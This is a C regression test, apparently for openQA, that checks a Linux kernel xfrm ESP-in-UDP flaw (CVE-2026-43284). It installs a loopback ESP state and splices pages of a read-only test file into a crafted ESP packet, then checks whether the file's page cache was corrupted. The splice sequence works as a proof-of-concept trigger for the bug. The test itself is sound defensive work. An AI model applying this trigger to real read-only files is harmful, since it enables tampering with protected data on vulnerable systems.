// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Standalone CVE-2026-43284 regression check for openQA.
 *
 * This is a temporary fallback for jobs where the LTP xfrm01 binary is not
 * packaged yet. It follows the same non-escalating model as the LTP test:
 * create a temporary file with known bytes, exercise ESP-in-UDP with spliced
 * file pages on loopback, and fail only if the temporary file page cache is
 * corrupted.
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif

#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#ifndef SPLICE_F_MORE
#define SPLICE_F_MORE 4
#endif

#define TESTFILE "pagecache_test"
#define ATKFILE "atk_data"

#define DATA_SIZE 4
#define SPI 0xdeadbeef
#define ENC_PORT 4500
#define ESP_HDR_SIZE 16
#define ICV_SIZE 16
#define AES_KEYLEN 16
#define SALT_LEN 4
#define KEYTOTAL (AES_KEYLEN + SALT_LEN)

static const uint8_t original[DATA_SIZE] = {'T', 'E', 'S', 'T'};

static const uint8_t aead_key[KEYTOTAL] = {
    0x00, 0x01, 0x02, 0x03, 0x04,
    0x05, 0x06, 0x07, 0x08, 0x09,
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e,
    0x0f, 0x10, 0x11, 0x12, 0x13};

static int file_fd = -1;
static int recv_fd = -1;
static int send_fd = -1;
static int atk_fd = -1;
static int pipefd[2] = {-1, -1};

static void close_fd(int *fd)
{
    if (*fd != -1) {
        close(*fd);
        *fd = -1;
    }
}

static void cleanup(void)
{
    close_fd(&pipefd[0]);
    close_fd(&pipefd[1]);
    close_fd(&recv_fd);
    close_fd(&send_fd);
    close_fd(&atk_fd);
    close_fd(&file_fd);
    unlink(TESTFILE);
    unlink(ATKFILE);
    system("ip xfrm state delete src 127.0.0.1 dst 127.0.0.1 proto esp spi 0xdeadbeef 2>/dev/null");
}

static void die(const char *msg)
{
    perror(msg);
    cleanup();
    exit(2);
}

static void setup_xfrm(void)
{
    char keyhex[KEYTOTAL * 2 + 3];
    char cmd[512];
    int ret;

    keyhex[0] = '0';
    keyhex[1] = 'x';
    for (int i = 0; i < KEYTOTAL; i++)
        sprintf(keyhex + 2 + i * 2, "%02x", aead_key[i]);

    if (system("ip link set lo up") != 0) {
        fprintf(stderr, "failed to bring loopback up\n");
        cleanup();
        exit(2);
    }

    snprintf(cmd, sizeof(cmd),
             "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 "
             "proto esp spi 0x%08x encap espinudp %d %d 0.0.0.0 "
             "aead 'rfc4106(gcm(aes))' %s 128 replay-window 32",
             SPI, ENC_PORT, ENC_PORT, keyhex);

    ret = system(cmd);
    if (ret != 0) {
        fprintf(stderr, "failed to install xfrm ESP state\n");
        cleanup();
        exit(2);
    }
}

static void write_all(int fd, const void *buf, size_t len)
{
    const uint8_t *pos = buf;

    while (len > 0) {
        ssize_t ret = write(fd, pos, len);

        if (ret < 0)
            die("write");

        pos += ret;
        len -= ret;
    }
}

static void try_corrupt(void)
{
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
        .sin_port = htons(ENC_PORT),
    };
    uint8_t esp_hdr[ESP_HDR_SIZE] = {0};
    uint8_t icv[ICV_SIZE] = {0};
    uint32_t spi_net = htonl(SPI);
    uint32_t seq_net = htonl(1);
    int encap = UDP_ENCAP_ESPINUDP;
    loff_t off;

    memcpy(esp_hdr, &spi_net, sizeof(spi_net));
    memcpy(esp_hdr + 4, &seq_net, sizeof(seq_net));

    atk_fd = open(ATKFILE, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (atk_fd < 0)
        die("open attacker file");

    write_all(atk_fd, esp_hdr, ESP_HDR_SIZE);
    if (lseek(atk_fd, 4096, SEEK_SET) < 0)
        die("lseek attacker file");

    write_all(atk_fd, icv, ICV_SIZE);
    if (fsync(atk_fd) < 0)
        die("fsync attacker file");

    posix_fadvise(atk_fd, 0, 0, POSIX_FADV_DONTNEED);
    close_fd(&atk_fd);

    atk_fd = open(ATKFILE, O_RDONLY);
    if (atk_fd < 0)
        die("open attacker file readonly");

    recv_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (recv_fd < 0)
        die("socket receiver");

    if (setsockopt(recv_fd, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0)
        die("setsockopt UDP_ENCAP");

    if (bind(recv_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        die("bind receiver");

    send_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (send_fd < 0)
        die("socket sender");

    if (connect(send_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        die("connect sender");

    if (pipe(pipefd) < 0)
        die("pipe");

    off = 0;
    if (splice(atk_fd, &off, pipefd[1], NULL, ESP_HDR_SIZE, SPLICE_F_MORE) < 0)
        die("splice ESP header");

    off = 0;
    if (splice(file_fd, &off, pipefd[1], NULL, DATA_SIZE, SPLICE_F_MORE) < 0)
        die("splice target file");

    off = 4096;
    if (splice(atk_fd, &off, pipefd[1], NULL, ICV_SIZE, 0) < 0)
        die("splice ICV");

    splice(pipefd[0], NULL, send_fd, NULL, ESP_HDR_SIZE + DATA_SIZE + ICV_SIZE, 0);

    close_fd(&pipefd[0]);
    close_fd(&pipefd[1]);
    close_fd(&recv_fd);
    close_fd(&send_fd);
    close_fd(&atk_fd);
}

int main(void)
{
    uint8_t readback[DATA_SIZE];
    ssize_t ret;

    setup_xfrm();

    file_fd = open(TESTFILE, O_WRONLY | O_CREAT | O_TRUNC, 0444);
    if (file_fd < 0)
        die("open test file");

    write_all(file_fd, original, DATA_SIZE);
    close_fd(&file_fd);

    file_fd = open(TESTFILE, O_RDONLY);
    if (file_fd < 0)
        die("open test file readonly");

    try_corrupt();
    close_fd(&file_fd);

    file_fd = open(TESTFILE, O_RDONLY);
    if (file_fd < 0)
        die("reopen test file");

    ret = read(file_fd, readback, sizeof(readback));
    if (ret != DATA_SIZE)
        die("readback");

    if (memcmp(readback, original, DATA_SIZE) != 0) {
        printf("TFAIL: Page cache was corrupted via xfrm ESP splice\n");
        cleanup();
        return 1;
    }

    printf("TPASS: Page cache was not corrupted\n");
    cleanup();
    return 0;
}
